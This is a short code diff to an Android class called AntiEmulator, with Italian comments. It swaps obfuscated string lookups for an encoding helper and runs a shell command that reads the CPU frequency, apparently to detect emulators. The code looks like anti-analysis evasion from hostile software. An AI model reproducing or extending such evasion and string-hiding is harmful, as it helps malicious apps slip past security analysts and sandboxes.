@@ -1,18 +1,14 @@
 package com.android.deviceinfo.util;
 
-import java.util.ArrayList;
-
 import android.content.Context;
 import android.os.Build;
-import android.os.Debug;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.crypto.Digest;
+import com.android.m.M;
 
 public class AntiEmulator {
 	private static final String TAG = "AntiEmulator";
@@ -33,7 +29,7 @@ public class AntiEmulator {
 		}
 
 		// "/"
-		index = keys.lastIndexOf(Messages.getString("36_7"));
+		index = keys.lastIndexOf(M.e("/"));
 
 		if (index == -1) {
 			return 0;
@@ -127,7 +123,7 @@ public class AntiEmulator {
 		Execute exec = new Execute();
 
 		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
-		ExecuteResult ret = exec.execute(Messages.getString("36_8"));
+		ExecuteResult ret = exec.execute(M.e("cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"));
 
 		// Ci interessa solo la prima riga
 		for (String frequency : ret.stdout) {
